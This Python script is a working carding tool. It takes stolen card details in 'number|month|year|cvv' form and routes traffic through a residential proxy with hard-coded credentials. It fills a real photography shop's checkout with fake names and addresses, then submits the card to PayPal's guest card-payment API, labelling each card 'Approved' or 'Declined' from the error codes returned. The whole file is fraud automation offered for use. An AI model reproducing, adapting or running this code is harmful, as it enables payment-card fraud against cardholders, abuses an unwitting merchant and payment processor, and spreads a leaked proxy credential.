import requests
from faker import Faker



def main(ccsa,):
    try:
        if '|' in ccsa:        expl = ccsa.strip().split('|')     
        if ':' in ccsa:        expl = ccsa.strip().split(':')     
                   
        cc = expl[0]
        mes = expl[1]
        ano = expl[2]
        cvv = expl[3]             
        fake = Faker()
        nombre = fake.first_name().lower()
        last = fake.last_name().lower()


        username = "geonode_rPnKX90jVA"
        password = "4f23e1c3-3338-4426-8352-10cea0dc5caf"
        GEONODE_DNS = "premium-residential.geonode.com:9000"
        proxies = {"http":"http://{}:{}@{}".format(username, password, GEONODE_DNS)}                     
        session = requests.Session()
        session.proxies = proxies
        

        headers = {'authority': 'lschroederphoto.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','referer': 'https://lschroederphoto.com/gallery/gallery.php?cat=animals&subcat=arthropods','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        params = {'id': '235',}

        session.get('https://lschroederphoto.com/shop/buy.php', params=params, headers=headers)

        headers = {'authority': 'lschroederphoto.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://lschroederphoto.com','referer': 'https://lschroederphoto.com/shop/buy.php?id=235','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        params = {'id': '235',}
        data = {'material': 'AcrylicPrint','sizeprice': '8x8 ($117.00)','filename': '029A7015','caption': 'Five-Legged Jumping Spider',}
        session.post('https://lschroederphoto.com/shop/buy.php', params=params, headers=headers, data=data)
         
        headers = {'authority': 'lschroederphoto.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://lschroederphoto.com','referer': 'https://lschroederphoto.com/shop/cart.php','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        data = {'zipCode': '','subtotal': '117.00','salesTax': '0.00','shippingCost': '7.50','couponValue': '0.00','totalPrice': '117.00',}
        session.post('https://lschroederphoto.com/shop/checkout.php', headers=headers, data=data)
        

        headers = {'authority': 'lschroederphoto.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://lschroederphoto.com','referer': 'https://lschroederphoto.com/shop/checkout.php','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        data = {'firstName': nombre,'lastName': nombre,'address': '10301 NW 108TH AVE  ','address2': '','city': 'miami','state': 'FL','newzip': '33166','country': 'United States','email': nombre+'@gmail.com','manual_checkout': 'true','oldzip': '','couponValue': '0.00','salesTax': '0.00','shippingCost': '7.50','subtotal': '117.00','totalPrice': '117.00',}
        checkout = session.post('https://lschroederphoto.com/shop/checkout.php', headers=headers, data=data)
        

        headers = {'authority': 'lschroederphoto.com','accept': '*/*','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryhxWqDBU9FLVxHIeR','origin': 'https://lschroederphoto.com','referer': 'https://lschroederphoto.com/shop/checkout.php','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        data = '------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="user_action"\r\n\r\nCONTINUE\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="landing_page"\r\n\r\nBILLING\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="shipping_preference"\r\n\r\nSET_PROVIDED_ADDRESS\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="first_name"\r\n\r\nHarold\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="last_name"\r\n\r\nsmith\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="address1"\r\n\r\n10301 NW 108TH AVE  \r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="address2"\r\n\r\n\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="city"\r\n\r\nmiami\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="state"\r\n\r\nFL\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="zip"\r\n\r\n33166\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="email"\r\n\r\nnonokan176@iucake.com\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="orderNum"\r\n\r\n1696793445\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="totalPrice"\r\n\r\n124.50\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="shippingCost"\r\n\r\n7.50\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="salesTax"\r\n\r\n0.00\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="subtotal"\r\n\r\n117.00\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="discount"\r\n\r\n0.00\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="cart"\r\n\r\na:1:{i:0;a:6:{s:5:"photo";s:26:"Five-Legged Jumping Spider";s:8:"filename";s:8:"029A7015";s:8:"material";s:12:"AcrylicPrint";s:4:"size";s:3:"8x8";s:6:"option";s:3:"N/A";s:5:"price";s:6:"117.00";}}\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR--\r\n'
        idtoken = session.post('https://lschroederphoto.com/shop/api/createOrder.php', headers=headers, data=data)
        if 'true' in idtoken.text:id = idtoken.json()['data']['id']
        else: return 'Declined! [x]','CARD_GENERIC_ERROR'
        

        headers = {'authority': 'www.paypal.com','accept': '*/*','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','content-type': 'application/json','origin': 'https://www.paypal.com','paypal-client-context': f'{id}','paypal-client-metadata-id': f'{id}','referer': f'https://www.paypal.com/smart/card-fields?sessionID=uid_9e32583254_mtk6mjc6mjk&buttonSessionID=uid_3a7cb51d39_mtk6mza6mzy&locale.x=es_EC&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhKU1g1SlVVY2Z5Y045T0Q3RU9HZlRhdEU0Z1VrYnZ2VUpSYWhSXzlUX1pCbkxfR1d3SUlLX3RBSy1wY2QyOW5GaG5ZVXZCbV9CQk1RMzAiLCJhdHRycyI6eyJkYXRhLXVpZCI6InVpZF9nY3Viem91eHR3b2xyeWdpc2V3eXdmcnFjY3lwenMifX0&disable-card=&token={id}','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','x-app-name': 'standardcardfields','x-country': 'US',}
        json_data = {'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ','variables': {'token': f'{id}','card': {'cardNumber': f'{cc}','expirationDate': f'{mes}/{ano}','postalCode': '10080','securityCode': f'{cvv}',},'phoneNumber': '8123672065','firstName': 'DANIEL','lastName': 'MEDINA','billingAddress': {'givenName': 'DANIEL','familyName': 'MEDINA','line1': 'Ms Diana Hayes','line2': '','city': 'new york','state': 'NY','postalCode': '10080','country': 'US',},'email': f'{nombre}@iucake.com','currencyConversionType': 'PAYPAL',},'operationName': None,}
        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit',headers=headers,json=json_data,)
         
        if 'RISK_DISALLOWED' in response.text: return 'Approved! ✅',response.json()['errors'][0]['data'][0]['code']
        elif 'EXISTING_ACCOUNT_RESTRICTED' in response.text: return 'Approved! ✅',response.json()['errors'][0]['data'][0]['code']
        elif 'VALIDATION_ERROR'  in response.text: return 'Approved! ✅',response.json()['errors'][0]['data'][0]['code']
        else: return 'Declined! ❌',response.json()['errors'][0]['data'][0]['code']


    except: return 'Declined! ❌','CARD_GENERIC_ERROR'